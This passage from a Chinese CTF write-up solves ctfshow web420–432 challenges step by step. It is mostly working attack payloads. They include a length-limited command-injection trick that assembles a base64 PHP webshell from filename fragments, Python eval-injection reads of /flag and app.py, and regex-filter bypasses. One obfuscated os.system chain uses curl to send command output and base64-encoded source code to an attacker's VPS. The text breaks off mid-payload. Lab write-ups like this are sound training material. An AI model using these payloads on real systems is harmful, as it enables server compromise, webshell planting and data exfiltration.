-n，但nl对行号显示格式和处理方式更灵活</p><p>经过尝试，发现flag在<code>/var/www</code>目录里面</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=nl ../*</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250821213744417.png"></p><p><strong>方法二：写文件并执行</strong></p><p>非常妙的一个方法，强烈建议学习，参考文章：<a href="https://www.cnblogs.com/-chenxs/p/11981586.html">命令注入长度限制绕过</a></p><p>假设我们要写入webshell</p><p>目标是传入<code>echo PD89ZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php;</code></p><p>先用<strong>重定向符</strong>创建文件，依次执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp\;</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\-\\</span><br><span class="line">&gt;4\ \\</span><br><span class="line">&gt;e6\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;=\|\\</span><br><span class="line">&gt;w=\\</span><br><span class="line">&gt;0pO\\</span><br><span class="line">&gt;bMV\\</span><br><span class="line">&gt;U1R\\</span><br><span class="line">&gt;1BP\\</span><br><span class="line">&gt;gkX\\</span><br><span class="line">&gt;hbC\\</span><br><span class="line">&gt;ZXZ\\</span><br><span class="line">&gt;PD89\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br></pre></td></tr></table></figure><p>然后把这些文件名以<strong>时间倒序</strong>形式写入任意一个文件，例如0</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br></pre></td></tr></table></figure><p>最后运行文件即可，会执行0里面的命令，然后在当前目录创建一个<code>1.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>连接蚁剑即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821224320607.png"></p><p>成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821224400535.png"></p><h3 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821233704196.png"></p><p>这次是要求code长度小于6，也就是长度为5</p><p>经过测试，发现flag就在当前目录。直接<code>nl</code>读取就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=nl f*</span><br></pre></td></tr></table></figure><p>然后打开源代码查看flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250821233821138.png"></p><h3 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h3><p>先看代码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822000032238.png"></p><p>相比上题，这题的code长度被限制在5以内</p><p>直接<code>nl</code>打印全部内容即可</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure><p>然后查看网页源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822000119903.png"></p><h3 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h3><p>打开源代码，可以看到提示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822105219034.png"></p><p>拼接code参数，一开始用PHP和直接执行命令都不行。经过测试，这个网站是python文件运行的，要用python代码执行</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=os.popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure><p>可以把原始代码打印出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=os.popen(&#x27;cat app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">code = request.args.get(<span class="string">&#x27;code&#x27;</span>) </span><br><span class="line"><span class="keyword">if</span> code: </span><br><span class="line"><span class="keyword">return</span> <span class="built_in">eval</span>(code) </span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>: </span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>执行命令获取flag即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=os.popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822105922009.png"></p><h3 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h3><p>这题用<code>?code=os.popen(&#39;ls&#39;).read()</code>会报内部错误，既然执行命令不可以，我们试试直接用open函数读取文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><p>成功执行，得到网页源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到，这次没有了os模块，没办法执行系统命令了，不过不影响我们读取文件</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822110555816.png"></p><h3 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h3><p>跟上题一样，先读取源代码看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> code:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到这题相比上题，<strong>过滤了code里面的os字符串</strong>，其他都是一样的，不影响我们做题</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822111723746.png"></p><h3 id="web426"><a href="#web426" class="headerlink" title="web426"></a>web426</h3><p>上题的payload也能用，先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题的正则匹配改了，简单解释一下</p><ul><li><code>re.compile(r&#39;os|popen&#39;)</code> 创建了一个模式，表示“匹配 <code>os</code> 或 <code>popen</code>”</li><li>竖线 <code>|</code> 是“或”的意思</li><li><code>reg.match(code)</code> 表示只从字符串开头匹配：<ul><li>如果字符串开头含 <code>os</code> 或 <code>popen</code>，匹配成功</li><li>否则匹配失败（即 <code>None</code>）</li></ul></li></ul><p>也就是<strong>开头不能包含os和popen</strong>，不过对我们影响不大</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web427"><a href="#web427" class="headerlink" title="web427"></a>web427</h3><p>可以继续用上题的payload，先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题比上题<strong>多过滤了system</strong>，不影响做题</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web428"><a href="#web428" class="headerlink" title="web428"></a>web428</h3><p>可以继续用上题的payload看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|popen|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题比上题<strong>多过滤了read</strong>，不过因为<code>reg.match(code)</code>匹配的是<strong>开头</strong>，所以对我们没有影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web429"><a href="#web429" class="headerlink" title="web429"></a>web429</h3><p>这题一开始用<code>open(&#39;app.py&#39;).read()</code>执行不了，猜测是某个地方被过滤了，经过尝试，在前面加个空格即可绕过限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到，这题过滤了open字符串，因为<code>re.match()</code> 是<strong>从字符串开头匹配</strong>，所以我们在前面加个空格即可绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web430"><a href="#web430" class="headerlink" title="web430"></a>web430</h3><p>可以用上题的payload，先看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这题把eval也过滤了，不过对我们没影响</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web431"><a href="#web431" class="headerlink" title="web431"></a>web431</h3><p>继续用上题的方法做就好，看看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;app.py&#x27;).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|str&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.<span class="keyword">match</span>(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这次多过滤了str，不影响做题</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="web432"><a href="#web432" class="headerlink" title="web432"></a>web432</h3><p>这题用不了之前的方法了，看了网上其他师傅的做法，可以用类似SSTI模板注入的方法来做，构造一条命令执行的链子</p><p>由于<code>os.system()</code>不会把命令的输出结果返回给 Python 程序，所以我们用<strong>curl外带数据</strong>显示</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`ls`&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250822163852721.png"></p><p>简单解释里面的一些代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)</span><br></pre></td></tr></table></figure><ul><li><p><code>__builtins__</code>：是 Python 的一个内置模块，包含了所有内建函数和对象（如 <code>print</code>, <code>str</code>, <code>dict</code> 等）。它在任何 Python 代码中都可以直接访问</p></li><li><p><code>__dict__</code>：这是 Python 对象的一个特殊属性，它是一个<strong>字典（dict）</strong>，存储了该对象（这里是 <code>__builtins__</code> 模块）的所有属性。键是属性名，值是属性本身</p></li><li><p><code>__builtins__.__dict__[&#39;__import__&#39;]</code>：这部分代码通过字典键值查询的方式，从 <code>__builtins__</code> 模块中获取了内建函数 <code>__import__</code>。这和直接写 <code>__import__</code> 是一样的，但更隐蔽</p></li><li><p><code>__getattribute__</code>：是 Python 对象的一个方法，用于获取对象的属性。<code>os.__getattribute__(&#39;system&#39;)</code> 的效果和 <code>os.system</code> 完全一样</p></li></ul><p><strong>%2b表示+号</strong>，目的是为了绕过正则匹配限制</p><p>我们可以通过curl把<code>app.py</code>内容转为base64编码外带到vps显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=str(__builtins__.__dict__[&#x27;__impo&#x27;%2b&#x27;rt__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;syste&#x27;%2b&#x27;m&#x27;)(&#x27;curl http://你的vps地址:端口?p=`base64 -w 0 app.py`&#x27;))</span><br></pre></td></tr></table></figure><p>默认情况下，<code>base64</code> 命令输出的编码字符串会在<strong>每 76 个字符后自动换行</strong>，所以我们不用<code>cat app.py|base64</code>，会显示不完整，我们用<code>base64 -w 0 app.py</code>即可，参数 <code>-w 0</code>表示取消换行</p><p><img src="https://oss.waynejoons.icu/picphoto/20250822164006703.png"></p><p>解码base64，成功得到网站源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    code = request.args.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>可以看到之前的<code>reg.match(code)</code>改成了<code>reg.search(code)</code>，意味着从检测开头变换到<strong>检测整个字符串</strong></p><p>最后找flag就可以</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 